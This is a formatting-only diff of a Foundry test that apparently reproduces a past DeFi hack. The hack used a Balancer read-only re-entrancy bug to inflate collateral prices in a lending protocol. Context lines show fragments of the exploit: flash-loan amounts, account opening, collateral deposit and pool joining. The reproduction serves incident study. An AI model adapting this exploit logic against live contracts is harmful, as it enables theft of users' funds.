@@ -14,12 +14,16 @@ import "./../interface.sol";
 // Attacker used view re-entrance Balancer bug to execute malicious code before pool balances were updated and steal money using overpriced collateral
 
 interface IWeightedBalancerLPOracle {
-    function getPrice(address token) external view returns (uint256);
+    function getPrice(
+        address token
+    ) external view returns (uint256);
 }
 
 interface IAccountManager {
     function riskEngine() external;
-    function openAccount(address owner) external returns (address);
+    function openAccount(
+        address owner
+    ) external returns (address);
     function borrow(address account, address token, uint256 amt) external;
 
     function deposit(address account, address token, uint256 amt) external;
@@ -77,7 +81,7 @@ contract ContractTest is Test {
         amounts[0] = 606 * 1e8;
         amounts[1] = 10_050_100 * 1e15;
         amounts[2] = 18_000_000 * 1e6;
-        uint256[] memory modes = new uint[](3);
+        uint256[] memory modes = new uint256[](3);
         modes[0] = 0;
         modes[1] = 0;
         modes[2] = 0;
@@ -114,7 +118,9 @@ contract ContractTest is Test {
         return true;
     }
 
-    function depositCollateral(address[] calldata assets) internal {
+    function depositCollateral(
+        address[] calldata assets
+    ) internal {
         WETH.withdraw(100 * 1e15);
         account = AccountManager.openAccount(address(this));
         WETH.approve(address(AccountManager), 50 * 1e18);
@@ -137,7 +143,9 @@ contract ContractTest is Test {
         AccountManager.exec(account, address(Balancer), 0, execData); // deposit 50 WETH
     }
 
-    function joinPool(address[] calldata assets) internal {
+    function joinPool(
+        address[] calldata assets
+    ) internal {
         WETH.approve(address(Balancer), 10_000 * 1e18);
         WBTC.approve(address(Balancer), 606 * 1e18);
         USDC.approve(address(Balancer), 18_000_000 * 1e6);
